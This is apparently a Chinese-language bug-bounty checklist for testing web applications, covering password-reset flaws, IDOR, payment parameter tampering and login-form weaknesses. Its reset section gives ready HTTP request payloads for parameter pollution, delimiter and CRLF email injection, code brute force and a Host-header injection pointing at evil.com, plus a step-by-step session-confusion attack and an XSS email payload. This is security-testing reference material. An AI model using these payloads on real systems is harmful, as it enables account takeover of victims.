## 密码找回


### 绕过前端验证

#### 不知道密码
1. 修改响应状态码
```java
响应

...
code: true /success /1
```
2. 抓包后删除（`username=***&pwaasd=***`）
3. 有些系统设定密码是纯数字进入口令修改界面（111111或者222222）

#### 知道密码
1. 响应包是否回显验证码
2. 重置跳转时，是否有id类的参数进行任意用户密码修改

### 邮箱/手机验证码找回
1. 参数污染

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com&email=hacker@mail.com
```

2. 验证码爆破

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com&code=$123456$
```


3. 在参数值中使用分隔符

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com,hacker@mail.com
```

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%20hacker@mail.com
```

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com|hacker@mail.com
```

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%00hacker@mail.com
```

4. 响应包中有指定接收端，可修改接收端号码

5. 参数值中没有domain

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim
```

6. 没有参数的值

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail
```

7. 邮件抄送

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com%0a%0dcc:hacker@mail.com
```

8. 如果body请求中有JSON数据，则添加逗号

```java
POST /newaccount HTTP/1.1
Host: target.com
...

{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
```

9. 邮箱密码重置链接是否可被构造

### 请求体字段

1. Find out how the tokens generate 了解令牌如何生成

- Generated based on TimeStamp 基于时间戳生成
- Generated based on the ID of the user 根据用户ID生成
- Generated based on the email of the user 根据用户的电子邮件生成
- Generated based on the name of the user 根据用户名生成

2. 主机标头注入

```java
POST /reset HTTP/1.1
Host: target.com
...

email=victim@mail.com
```

to

```java
POST /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
...

email=victim@mail.com
```
受害者将收到重置链接evil.com

3. cookie混淆
```java
大致攻击思路:
1. 用攻击者账号13908080808进入密码找回流程，查收重置验证码、通过校验
2. 输入新密码后提交，拦截中断该请求，暂不发至服务端，这时，PHPSESSID 关联的是13908080808账号;
3. 接着，关闭浏览器的burp代理，新开重置流程的首页，在页面中输入普通账号13908090133后获取短信验证码，这时，PHPSESSID 已关联成13908090133了;
4. 最后，放行之前中断的请求，放至服务端，逻辑上，可以成功重置13908090133的密码。
```

### 补充
尝试跨站点脚本（XSS）的形式

```java
"<svg/onload=alert(1)>"@gmail.com
```


### 参考
- [github](https://github.com/daffainfo/AllAboutBugBounty/blob/master/Checklist/Forgot%20Password.md)
- [10 Password Reset Flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
- [Frooti](https://twitter.com/HackerGautam/status/1502264873287569414)

## IDOR
1. 两个账号，修改id查看信息
2. id等表示可以从注册，密码找回，用户信息等地方寻找
3. 修改账号信息时查看数据包，修改用户id等参数进行遍历
4. 登录时查看有没有返回账号密码等信息的接口，修改接口id

## 支付
1. 修改参数：商品id、数量、金额、订单号、优惠码
2. 支付接口修改：积分支付和金额支付接口
3. 获得支付成功的界面数据包，将另一个订单提交时的参数填入，构造一个数据包尝试直接访问

## 登录框
1. 通用cms漏洞
2. 验证码漏洞
	1. 验证码爆破
	2. 验证码缺失
	3. 验证码返回
	4. 验证码失效
	5. 万能验证码（00000）
	6. 验证码绕空
3. 用户枚举
	1. 同密码，用户枚举
	2. 返回值不同枚举用户（该账户不存在/ 密码不正确）
4. 登录绕过
5. SQL注入
6. 未授权访问（目录扫描）
7. 旁站注入
8. [分析js寻找接口](https://mp.weixin.qq.com/s?biz=Mzg4MzA4Nzg4Ng==&mid=2247483903&idx=1&sn=0f8b83fb47477d863ad0fd234c7d9baa&chksm=cf4d8e9ef83a0788f645e5c0142db88f05455460833cf1c64634a0e791df4b8e0d111ea8be32&mpshare=1&scene=1&srcid=&sharersharetime=15702321411118sharer_shareid=3c01de44428cb0260e595e29ccda8831#rd)
	1. fuzz
		1. 寻找js文件存放目录
		2. 寻找参数
	2. 目录扫描 ：状态码403的目录（在于寻找可能存在调用接口的链接）
	3. 拼接处完整的接口地址进行漏洞检测

